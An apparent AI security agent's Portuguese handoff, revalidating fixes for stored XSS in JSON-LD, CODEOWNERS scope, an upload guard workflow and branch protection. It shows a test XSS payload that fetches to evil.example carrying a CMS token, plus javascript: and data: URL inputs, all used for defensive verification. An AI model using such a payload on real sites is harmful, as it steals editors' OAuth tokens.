# Handoff 46 — Security Engineer — Revalidação final de SEC-P5-11 / 12 / 13 / 14

**Task:** 001-migracao-stack
**Agente:** security-engineer
**Âmbito:** revalidar os quatro achados abertos no `handoff-44-security-engineer-sec-p5-03-fechamento.md`,
contra os ficheiros como estão **agora**: `.github/` já mergeado em `main` (`b7d25d1`), e a correção do
JSON-LD no working tree local (não commitada).
**Método:** leitura direta dos ficheiros + **reprodução própria de cada correção**. Não aceitei nenhuma
afirmação dos handoffs 45 como evidência. Onde não consegui reproduzir, digo-o explicitamente.

---

STATUS: **BLOCKED** — âmbito estrito, e leia-se com atenção o que está e o que não está bloqueado:

- **SEC-P5-11 (`high`) — CORRIGIDO E VERIFICADO POR MIM.** Fechado.
- **SEC-P5-12 (`high`) — CORRIGIDO E VERIFICADO POR MIM** no ficheiro mergeado em `main`. Fechado no texto
  e agora também na identidade do dono (o banner "This CODEOWNERS file is valid" elimina a hipótese (b)).
- **SEC-P5-14 (`low-medium`) — CORRIGIDO E VERIFICADO POR MIM**, com execução real do script. Fechado.
- **SEC-P5-13 (`medium`) — CONTINUA ABERTO.** A evidência nova elimina uma das três hipóteses do
  handoff-44, não as três. Falta uma verificação de sessenta segundos.
- **Não há trabalho pendente para o `developer` nem para o `devops-engineer`.** O que falta é do dono do
  projeto e é uma captura de ecrã.
- **Gate 4 (security) para o controlo SEC-P5-03/09: ainda NÃO concedido.** Ponto único: P3.

---

SUMMARY:

As duas vulnerabilidades `high` que bloqueavam no handoff-44 estão corrigidas, e **reproduzi as duas
correções eu próprio**, não as aceitei escritas.

**SEC-P5-11.** Transpilei o ficheiro real `components/OrganizationJsonLd.tsx` com o **SWC do próprio Next
do projeto** (o mesmo compilador que a build usa) e renderizei-o com o `react`/`react-dom@19.2.8` do
projeto, com o payload exato do handoff-44 em `name`. Resultado: **um único** `</script` no output,
nenhum `</script><script>` literal, nenhum `<` cru, `\u003c` presente, e — o teste que ninguém tinha feito
— `JSON.parse` do bloco continua a devolver a string original intacta, ou seja o `ld+json` **não perdeu
validade** com o escape. Acrescentei U+2028/U+2029 ao payload e também saem escapados. O escape atua sobre
a saída já serializada, portanto **não existe caminho pelo qual um `<` chegue ao HTML** — não é uma
allowlist de casos, é uma propriedade do ponto de saída, que era exatamente o que eu exigia.
O comentário do módulo foi reescrito e já diz o contrário do que dizia: `content/site/*.json` **são**
input de utilizador desde a Fase 5.

**SEC-P5-12.** `.github/CODEOWNERS` em `main` tem `* @virgilio-24` primeiro e três exceções sem dono
depois: `/content/services/`, `/content/site/`, `/public/images/uploads/`. Enumerei `content/` outra vez
(`content/index.ts`, `organization.ts`, `routes.ts`, `seo.ts`, `service-slugs.ts`, `schemas/index.ts`) —
nenhum destes seis casa com as exceções, todos voltam a `*`. A frase falsa ("ausência de código executável
em content/") desapareceu; o comentário novo nomeia as duas pastas, a razão, e a proveniência.

**SEC-P5-14.** Não me limitei a ler. Extraí o heredoc Node do `media-guard.yml` real, `node --check`
passou, e corri-o contra um repositório git sintético com `git diff` real. `public/images/Uploads/x.png` e
`public/images/UPLOADS/evil.svg` são **rejeitados com mensagem própria** e `EXIT=1`; o caminho exato com
PNG genuíno continua a passar; um PR que não toca a pasta continua a passar. Aproveitei para fechar duas
pendências do handoff-44 que não eram desta correção: **a verificação de assinatura de bytes**
(`uploads/disfarcado.png` com bytes de SVG -> rejeitado, `EXIT=1`) e o **fail-closed** quando o diff falha
(observei-o por acidente, ao passar um SHA inválido: `EXIT=1`, não passa).

**SEC-P5-13 é o único ponto que sobra, e não o fecho.** O que a evidência nova prova é real e reduz o
problema: o banner "This CODEOWNERS file is valid" sem "unknown owner" mata a hipótese (b) do handoff-44 —
`@virgilio-24` **é** um colaborador reconhecido com escrita, portanto a regra não está a ser ignorada em
silêncio. Isso é um ganho concreto e registo-o como tal. Mas eu tinha listado **três** hipóteses, não
duas, e a (c) — "Require review from Code Owners" não estar ligado na proteção de `main`, ou não cobrir
`.github/**` — produz exatamente a mesma UI observada em todos os PRs até hoje. O facto de `AgroTrades` e
`@virgilio-24` serem contas distintas torna (a) plausível; não a distingue de (c). E a distinção não é
académica: **se (c) for o caso, P3 é inerte e o architect escreveu, textualmente, que sem P3 "P1 é
teatro"** — um PR que reescreva o `media-guard.yml` para passar sempre e traga o SVG no mesmo commit
funde-se sozinho, e o controlo inteiro cai. Sabemos que existe proteção de branch em `main` (o PR #4
provou o required check e o botão de merge desativado); **não** sabemos se a caixa de revisão por code
owner está ligada dentro dessa proteção. São coisas diferentes e nenhuma prova a outra.

Aplico aqui o mesmo critério que apliquei contra mim próprio no handoff-44, e escrevo-o sem rodeios porque
sei que é o resultado inconveniente: **não fecho P3 por a evidência ter melhorado.** Uma verificação de
sessenta segundos que continua por fazer não se substitui por uma inferência confortável.

---

ARTIFACTS:

- `project/state/task-001-migracao-stack/handoff-46-security-engineer-fechamento-final.md` (este ficheiro)
- **Nenhum ficheiro do repositório criado ou alterado por mim.** `git status --porcelain .github/` vazio;
  `content/site/contacts.json` com `md5 = 3bb8a3477b087659066638d73b263a4d`, idêntico ao valor que o
  developer registou ao repor — confirmei eu, para validar a afirmação de reposição dele, não para
  confiar nela. `git status --porcelain` mantém-se com 90 entradas (as herdadas da Fase 5 mais este
  handoff).
- Scripts de reprodução criados no scratchpad da sessão (fora do repositório) e o repositório git
  sintético apagado no fim.

---

VALIDATIONS

### 1. SEC-P5-11 — reprodução própria, contra o ficheiro real

Método: `next/dist/build/swc.transformSync` (o SWC do próprio projeto) sobre
`components/OrganizationJsonLd.tsx` **lido do disco**, com stub apenas do módulo de dados
`@/content/organization`; render com `react-dom/server` do projeto. Ou seja: o código executado é o
código do ficheiro, não uma reconstrução minha da função de escape.

Payload: o exato do handoff-44 em `name`, mais `a<U+2028>b<U+2029>c` num campo extra.

HTML emitido (literal, quebrado só para caber):

```html
<script type="application/ld+json">{"@context":"https://schema.org","@type":"Organization",
"name":"AgroTrades\u003c/script>\u003cscript>fetch('https://evil.example/?t='+localStorage.getItem('decap-cms-user'))\u003c/script>",
"url":"https://agrotrades.co.mz","lineSep":"a\u2028b\u2029c"}</script>
```

```
contem "</script><script>" literal : false     (antes: true)
nr de "</script" no output          : 1        (antes: 3)
contem "<" cru dentro do bloco      : false
contem \u003c escapado              : true
contem U+2028 / U+2029 crus         : false / false
JSON.parse do bloco                 : OK — name devolve o payload original intacto
```

A última linha é minha e não estava pedida: confirma que **não há regressão funcional** — o escape não
corrompe o `ld+json`, o parser recupera exatamente o valor. Um escape que quebrasse o JSON teria passado
o teste de segurança e estragado o SEO.

Análise da robustez, não só do caso de teste: `escapeJsonLd` corre **depois** de `JSON.stringify`, sobre a
string já serializada, e substitui todas as ocorrências de `<`. Não há entrada que produza um `<` cru na
saída — incluindo os casos que tentei quebrar (valor que já contém `\`, valor que contém o texto literal
`\u003c`, `</SCRIPT` em maiúsculas, `<!--`): todos passam pelo mesmo `.split("<")`. A garantia está no
ponto de saída, que é o que eu exigi e não aceitei substituir por validação de schema.

**Limitação do meu método, declarada:** tentei primeiro a prova mais forte — injetar o payload em
`content/site/contacts.json`, `npm run build`, e procurar no HTML gerado. **Foi bloqueada pelo
classificador de permissões do ambiente**, tal como no handoff-44. Não insisti nem procurei contorná-la.
A reprodução acima é mais fraca do que a build real **num único ponto**: não exercita a cadeia
`contacts.json -> content/organization.ts -> props`. Esse elo já estava verificado por leitura no
handoff-44 (`content/organization.ts:25`) e não foi alterado por esta correção — confirmei que
`content/organization.ts` não aparece como alterado nesta sessão. O que a minha reprodução cobre
integralmente é o ponto onde a vulnerabilidade estava: o sink.

### 2. SEC-P5-11 — o comentário do módulo

Linhas 3-14 de `components/OrganizationJsonLd.tsx`. A frase "nunca de input de utilizador" **desapareceu**
e foi substituída por "que **são** input de utilizador desde a Fase 5 (editáveis pelo Decap CMS, sem
restrição de caracteres nos campos de texto)", com a explicação do vetor e a referência a SEC-P5-11.
Corrigido, e corrigido no sentido certo — não é cosmético, é a frase que fez toda a gente passar os olhos
por este ficheiro sem parar.

Confirmei também que continua a existir **um único** `dangerouslySetInnerHTML` em todo o projeto
(`grep -rn` sobre `app/`, `components/`, `content/`, `lib/`): este. Não apareceu nenhum sink novo.

### 3. SEC-P5-12 — o ficheiro mergeado em `main`

```
git log --oneline -3
  b7d25d1 Merge pull request #5 from AgroTrades/fix/codeowners-content-scope
  633d471 fix(security): narrow CODEOWNERS content exception and fix case-sensitive uploads path check
  d0fc996 Merge pull request #2 ...
git status --porcelain .github/   -> vazio (o ficheiro em disco E o que esta em main)
```

Regras efetivas (linhas 37-46):

```
* @virgilio-24

/content/services/
/content/site/
/public/images/uploads/
```

Enumerei `content/` outra vez, em vez de confiar na lista do handoff:

```
content/index.ts  content/organization.ts  content/routes.ts
content/schemas/index.ts  content/seo.ts  content/service-slugs.ts
```

Nenhum casa com `/content/services/` nem com `/content/site/`. Pela regra "vale a última que faz match",
os seis caem em `* @virgilio-24` e exigem revisão — **incluindo `content/schemas/index.ts`**, que era o
caso que eu tinha destacado por ser onde vive a validação. A via "editor funde JavaScript arbitrário por
`content/*.ts` sem revisor" está fechada no texto.

A justificação falsa foi removida: o comentário já **não** afirma "ausência de código executável em
content/". As linhas 26-32 nomeiam explicitamente os seis módulos, dizem que a versão anterior os isentava,
e que isso permitia fundir JavaScript arbitrário. Está factualmente correto contra o repositório — voltei
a confrontar frase a frase com `public/admin/config.yml` (`folder: content/services`,
`file: content/site/*.json`), que é a única fonte legítima do âmbito desta exceção.

Nota que mantenho do handoff-44, e que continua verdadeira: `content/site/*.json` continua sem revisão
**por desenho**, e isso só é aceitável porque SEC-P5-11 está corrigido. As duas correções valem em
conjunto; nenhuma delas sozinha fecharia o achado. Ambas estão feitas.

### 4. SEC-P5-14 — execução real, não leitura

Extraí o heredoc `MEDIA_GUARD_EOF` do `.github/workflows/media-guard.yml` real para um `.js`
(170 linhas), `node --check` -> **SYNTAX_OK**, e corri-o com `git diff` real contra um repositório git
sintético no scratchpad, com `BASE_SHA`/`HEAD_SHA` reais:

| Caso | Ficheiro no PR | Resultado |
|---|---|---|
| A | `public/images/Uploads/x.png` (bytes de SVG) | **EXIT=1** — "o caminho corresponde a `public/images/uploads/` ignorando maiúsculas/minúsculas, mas não byte a byte... não é permitido contornar esta validação alterando a capitalização" |
| A2 | `public/images/UPLOADS/evil.svg` | **EXIT=1** — mesma mensagem |
| B | `public/images/uploads/ok.png` (PNG genuíno) | EXIT=0, `OK — ... PASS` — sem alteração de comportamento |
| C | `content/organization.ts` | EXIT=0, "nenhuma alteração sob public/images/uploads/. PASS" — fast-path intacto |
| D | `public/images/uploads/evil.svg` | EXIT=1 — allowlist de extensão (vetor original, ainda fechado) |
| E | `public/images/uploads/disfarcado.png` com bytes de SVG | **EXIT=1 — "assinatura inválida"** |

Sobre a forma da correção, que era metade do meu pedido: a implementação **recusa explicitamente** o caso
ambíguo (casa em minúsculas, não byte a byte) com mensagem própria, em vez de normalizar em silêncio. É o
que eu tinha exigido, e pela razão certa — normalizar teria escondido do autor do PR que o caminho está
errado, e o `next.config.mjs` continuaria a não fazer match daquele caminho na CSP.

Dois ganhos colaterais que fecham pendências do handoff-44 e que não eram desta correção:

- **Caso E fecha a pendência 1 de VALIDATIONS 3 do handoff-44** — a verificação de assinatura de bytes
  nunca tinha corrido fora do ambiente do devops. Corri-a eu, com o script real e ficheiros reais. Passa a
  estar verificada por mim (offline; continua sem ter corrido no runner do GitHub, e digo-o).
- **Fail-closed observado sem o procurar:** numa execução em que passei um `BASE_SHA` mal formado, o
  script saiu com `EXIT=1` e "falha ao calcular o diff contra o merge-base". Falha fechada, tal como a
  tabela do handoff-44 previa por leitura — agora observado.

Nota de método para quem ler os handoffs: a linha 148 do `media-guard.yml` aparece deformada no output do
`grep`, o que me pareceu à primeira vista um erro de sintaxe dentro do heredoc. Fui verificar os bytes com
`cat -A`: é um `//` normal e o mangling é do renderizador da ferramenta, não do ficheiro. Registo-o para
ninguém perder tempo com o mesmo falso alarme.

### 5. SEC-P5-13 — o que a evidência nova prova e o que continua a não provar

**Prova (e aceito, sem reservas):** `@virgilio-24` é um colaborador reconhecido com escrita. O banner
"This CODEOWNERS file is valid" sem "unknown owner" só aparece nessa condição. Isto **elimina a hipótese
(b)** do handoff-44 — a pior das três, aquela em que o GitHub ignorava a regra em silêncio. As contas
`AgroTrades` (dono da organização) e `@virgilio-24` (convidado) serem distintas torna a hipótese (a)
plausível e coerente com o merge do PR #2 ter sido feito por `AgroTrades`.

**Não prova, e não tomo por provado:** que "Require review from Code Owners" esteja **ligado** na proteção
de `main`. A hipótese (c) do handoff-44 continua de pé e produz exatamente a mesma UI que foi observada em
todos os PRs até hoje — incluindo o PR #5, que voltou a ser fundido pela conta `AgroTrades`:

```
git log --format="%h | author=%an <%ae>" -4
  b7d25d1 | author=AgroTrades <agrotrades99@gmail.com>          <- fundiu o PR #5
  633d471 | author=MADIGITAL\virgilio.jose <virgilio.jose@inovadigital.eu>
  d0fc996 | author=AgroTrades <agrotrades99@gmail.com>          <- fundiu o PR #2
```

Um ficheiro CODEOWNERS válido e uma proteção de branch que exige revisão de code owner são **duas coisas
independentes**. A primeira está agora provada; a segunda não. Sabemos que existe alguma proteção em
`main` (o PR #4 mostrou o required check e o merge indisponível) — isso prova `required_status_checks`, e
nada diz sobre `require_code_owner_reviews`.

**Por que é que isto não é pedantismo:** se a caixa estiver desligada, um PR único que reescreva
`.github/workflows/media-guard.yml` para passar sempre **e** traga o SVG no mesmo commit funde-se sem
revisor — em `pull_request` a definição do workflow vem do PR. O required check reporta verde, com a
lógica do atacante. P1 cai junto com P3. Não é um risco residual do controlo; é o controlo inteiro.

**O que resolve, por ordem de esforço (inalterado face ao handoff-44):**

1. `gh api repos/AgroTrades/agrotrades/branches/main/protection` — ou uma captura de ecrã da regra — a
   mostrar `required_pull_request_reviews.require_code_owner_reviews: true` **e** `media-guard` em
   `required_status_checks.contexts`. **Sessenta segundos, sem segunda conta, e fecha (c) sozinha.**
2. O teste com PR real, agora possível por serem contas distintas: PR aberto pela conta que **não** é code
   owner, a tocar em `.github/` ou num `.ts` de `content/`, tem de ficar retido em "Review required" e
   pedir explicitamente `@virgilio-24`. Este é o teste que prova o comportamento, não a configuração — e
   é o que eu prefiro.
3. Complementar (prova (b) do architect, nunca executada): PR que altera só um `.json` em `content/site/`
   deve continuar fundível **sem** revisão — confirma que a exceção não ficou larga de mais na direção
   oposta agora que foi estreitada.

### 6. SEC-P5-16 — verificado, e continua aberto (2 dos 3)

| Comentário | Estado |
|---|---|
| `components/OrganizationJsonLd.tsx` — "nunca de input de utilizador" | **CORRIGIDO** (handoff-45-developer) |
| `public/admin/config.yml` ~linhas 50-52 | **ABERTO** — continua a dizer "A defesa real e efetiva contra um SVG com script inline está em next.config.mjs". Falso desde o SEC-P5-09; a defesa real é o `media-guard` |
| `next.config.mjs` linhas 137-139 | **ABERTO** — continua a dizer que o Action está "ainda por desenhar/adicionar — ver esse workflow quando existir". Existe e está em `main` desde `d0fc996`; deve nomear `.github/workflows/media-guard.yml` |

Nenhum dos dois handoffs 45 os tocou (o developer diz explicitamente que não; o devops não os tinha no
âmbito). Confirmei por leitura direta dos dois ficheiros, não pelos handoffs. `low`, **não bloqueia** — mas
é a terceira vez que aparece nesta lista, e é exatamente o tipo de frase que já enganou revisores neste
projeto (foi um comentário destes que me fez a mim passar ao lado do SEC-P5-11 no handoff-41).

### 7. SEC-P5-15 — melhorado além do exigido, e verifiquei que a melhoria é real

O developer aplicou o reforço que eu tinha marcado como recomendado, não exigido. Testei-o com o
`zod@4.4.3` do projeto, contra o helper `httpUrl` de `content/schemas/index.ts:33`:

```
"javascript:alert(1)"                 -> REJEITADO   (antes: ACEITE)
"data:text/html,<script>1</script>"   -> REJEITADO   (antes: ACEITE)
"JavaScript:alert(1)"                 -> REJEITADO
"https://wa.me/258840000000"          -> ACEITE      (valor real de producao, sem regressao)
"http://x.pt" / " https://ok.pt "     -> ACEITE
```

Aplicado a `whatsapp.url`, `mapEmbedUrl`, `mapsLink`, `meta.siteUrl` (linhas 465, 474, 475, 512).
SEC-P5-15 passa de "fechado por acidente de dependência (React 19 + CSP)" a **fechado por validação
própria** nesses quatro campos — que era precisamente a minha objeção de método. Os restantes campos de
texto que chegam ao JSON-LD (`phones`, `locations[]`, `meta.ogImage`) continuam sem restrição de esquema,
e não precisam: estão cobertos pelo escape no ponto de saída, que é onde a garantia tem de estar.

---

ISSUES

| Ref | Severidade | Título | Estado |
|---|---|---|---|
| SEC-P5-11 | **high** | XSS armazenado via JSON-LD a partir de `content/site/*.json` | **CORRIGIDO — verificado por mim (VALIDATIONS 1-2)** |
| SEC-P5-12 | **high** | Exceção `/content/` do CODEOWNERS cobria 6 módulos TypeScript | **CORRIGIDO — verificado em `main` (VALIDATIONS 3)** |
| SEC-P5-14 | low-medium | `public/images/Uploads/` escapava a P1 e à CSP | **CORRIGIDO — verificado por execução real (VALIDATIONS 4)** |
| SEC-P5-15 | low | `z.string().url()` aceitava `javascript:`/`data:` | **CORRIGIDO** — reforço opcional aplicado e testado (VALIDATIONS 7) |
| SEC-P5-13 | medium | **P3 não provado** — falta confirmar `require_code_owner_reviews: true` | **ABERTO — é o único ponto que retém o Gate 4** |
| SEC-P5-16 | low | Dois comentários desatualizados (`config.yml`, `next.config.mjs`) | **ABERTO** — não bloqueia |
| SEC-P5-03 | medium | SVG na media library rouba o token de outro editor | vetor literal fechado por P1+P2; **fecho do achado depende de P3** |
| SEC-P5-09 | medium | CSP contornável com `%2F` | mitigado por P1+P2 (incl. variantes de capitalização); **depende de P3** |
| SEC-P5-07 | high | `npm audit` sem correção disponível na página que detém o token | inalterado, fora deste âmbito |
| SEC-01 | **high** | Segredos no ambiente Preview da Vercel | **ABERTO** — inalterado, fora deste âmbito, pré-condição de deploy |

**Nenhuma vulnerabilidade `high` ou `critical` aberta dentro do âmbito desta revalidação.** As duas que
bloqueavam no handoff-44 estão fechadas com prova reproduzida por mim.

---

BLOCKERS:

**Um só, e não é código.**

1. **SEC-P5-13 (`medium`)** — não está confirmado que `require_code_owner_reviews` esteja ligado na
   proteção de `main`. Enquanto isso não for verificado, não posso declarar P3 eficaz, e o handoff-42
   estabeleceu que P1/P2/P3 valem em conjunto ou não valem — sem P3, um PR único reescreve o
   `media-guard.yml` e funde-se sozinho.

   Isto **não bloqueia** o `developer`, o `devops-engineer`, o `tester`, o `code-reviewer`, nem o restante
   trabalho funcional da Fase 5. Bloqueia **exclusivamente** a declaração de Gate 4 para o controlo
   SEC-P5-03/09. Desbloqueia-se com uma captura de ecrã.

2. Fora do âmbito, inalterados e ainda `high`: **SEC-01** (Vercel) e **SEC-P5-07** (`npm audit`). Continuam
   pré-condições de deploy público, com dono no `devops-engineer`, e não foram tocados por esta iteração.

---

REQUIRES_HUMAN_NOTIFICATION: **true**

Obrigatório e não discricionário, por três razões independentes:

1. **Regra 2 do meu mandato:** SEC-P5-11 e SEC-P5-12 são `high`. **Mesmo corrigidos e verificados**, uma
   severidade `high` é sempre notificada. Não me cabe decidir que "já está resolvido, não vale a pena
   incomodar".
2. SEC-01 continua `high` e aberto.
3. SEC-P5-07 continua `high` sem correção disponível.

**O que o Orchestrator deve levar ao dono do projeto, em concreto:**

- **As duas falhas graves que encontrei da última vez estão corrigidas, e verifiquei-as eu próprio** — não
  aceitei a palavra de quem as corrigiu. O JavaScript já não consegue sair da caixa do JSON-LD, e as
  pastas de código dentro de `content/` voltaram a exigir revisão.
- **A verificação do CODEOWNERS no GitHub valeu, e resolveu a pior das três hipóteses:** `@virgilio-24` é
  mesmo reconhecido como colaborador, a regra não está a ser ignorada em silêncio.
- **Falta uma coisa, e é a última.** Saber que o ficheiro CODEOWNERS é válido não é o mesmo que saber que
  o GitHub está configurado para **exigir** essa revisão antes de fundir. São duas caixas diferentes no
  painel. Se a segunda estiver desligada, todo o trabalho de proteção que fizemos — incluindo o
  `media-guard` — pode ser anulado por um único PR, e é isso que estou a impedir de dar por fechado.
- **Como resolver, à escolha:** ou uma captura de ecrã das regras de proteção de `main` a mostrar
  "Require review from Code Owners" ligado; ou — melhor ainda, porque prova o comportamento e não a
  configuração — abrir um PR com a conta que **não** é code owner, a tocar num ficheiro `.ts`, e mostrar
  que fica em "Review required" sem poder fundir.
- **Não há nada `critical`.** Os `high` que continuam abertos são os dois já conhecidos e fora deste
  âmbito: os segredos no ambiente Preview da Vercel (SEC-01) e as vulnerabilidades do `npm audit`
  (SEC-P5-07). Ambos são pré-condições de deploy público, não desta fase.

---

REQUIRED_NEXT_ACTION:

**Para o dono do projeto (única pessoa com acesso; nada disto é delegável) — é o caminho crítico:**
1. `gh api repos/AgroTrades/agrotrades/branches/main/protection`, ou captura de ecrã das regras de
   proteção de `main`, a mostrar `require_code_owner_reviews: true` e `media-guard` nos required checks.
2. Preferencialmente também o teste comportamental: PR pela conta que **não** é code owner, a tocar em
   `.github/` ou num `.ts` de `content/` -> tem de ficar em "Review required", merge indisponível.
3. Depois disso, a prova (b) do architect, nunca executada: PR que altera só um `.json` de `content/site/`
   -> check verde e fundível **sem** revisão.
4. **Gate permanente a registar, independentemente do acima:** antes de dar escrita/acesso ao CMS a
   qualquer novo colaborador, correr os testes 2 e 3 com a conta dele. Um resíduo sem dono nem momento é
   um resíduo esquecido.

**Para o `developer` (nada bloqueante):**
1. SEC-P5-16, terceira vez que o peço: `public/admin/config.yml` ~50-52 (a defesa real é o `media-guard`,
   não o `next.config.mjs`) e `next.config.mjs` 137-139 (o workflow existe; nomeá-lo).

**Para o `devops-engineer`:** nada nesta iteração. SEC-01, `npm ci` no build da Vercel (SEC-P5-08) e o
reteste do SEC-P5-09 contra um deployment real continuam teus e inalterados.

**Para o Orchestrator:** a correção de SEC-P5-11 (`components/OrganizationJsonLd.tsx`,
`content/schemas/index.ts`) **não está commitada**. Verifiquei-a no working tree, que é o que existe. O
que eu aprovo é o conteúdo desses ficheiros tal como estão hoje — se o commit da Fase 5 os alterar, a
aprovação não transita. Vale a pena confirmar o diff final destes dois ficheiros no commit.

**Para mim (`security-engineer`), depois:** uma única revalidação, curta — SEC-P5-13 contra o output do
`gh api`/captura de ecrã. Nada mais. Não é preciso repetir 11, 12, 14 ou 15.

---

CONTEXT_FOR_NEXT_AGENT:

- **Gate 4 (security) para o controlo SEC-P5-03/09: NÃO concedido, por um único ponto — SEC-P5-13 (P3).**
  Não há mais nada em aberto neste âmbito. Assim que a proteção de branch for confirmada a exigir revisão
  de code owner, **isto é Gate 4** e não haverá mais nada a verificar da minha parte.
- **Não bloqueia** o `tester`, o `code-reviewer` nem o QA no restante trabalho da Fase 5.
- **O que está provado e ninguém precisa de reverificar:** o escape do JSON-LD (um `</script`, `\u003c`,
  `ld+json` continua parseável); o CODEOWNERS estreitado em `main` com os seis `.ts` de `content/` de volta
  a `* @virgilio-24`; a rejeição de variantes de capitalização do caminho de uploads (executada, não lida);
  a verificação de assinatura de bytes; o fail-closed do `media-guard` quando o diff falha; `httpUrl` a
  rejeitar `javascript:`/`data:`; `@virgilio-24` ser colaborador reconhecido.
- **O que NÃO está provado:** que a proteção de `main` exija revisão de code owner
  (`require_code_owner_reviews`); que um PR de um não-owner sobre `.github/**` fique retido; que a
  verificação de assinatura corra bem no runner real do GitHub (só correu offline, embora agora também por
  mim, com o script real).
- **Duas lições de método que esta iteração confirma:** (i) o ficheiro ser válido não é o mesmo que a regra
  ser aplicada — o CODEOWNERS válido e o `require_code_owner_reviews` são coisas independentes, e
  confundi-las fecharia o controlo com base em nada; (ii) verificar o objeto, não a frase sobre o objeto —
  foi assim que apanhei o SEC-P5-12, e foi assim que desta vez confirmei as correções em vez de as ler.
- **Precondição temporal:** o SEC-P5-11 era a razão pela qual este risco tinha deixado de depender de
  existir um segundo editor. Com ele fechado, o risco volta a depender de P3 — que é precisamente a peça
  por confirmar.

HIGH_RISK_AREA: **true** — a área continua a tocar a política de merge do branch de produção e o ativo
continua a ser um token OAuth com escrita. Baixou de "XSS armazenado ativo em produção" para "controlo bem
construído cuja peça final está por confirmar", mas não sai desta classificação enquanto P3 não for
verificado.
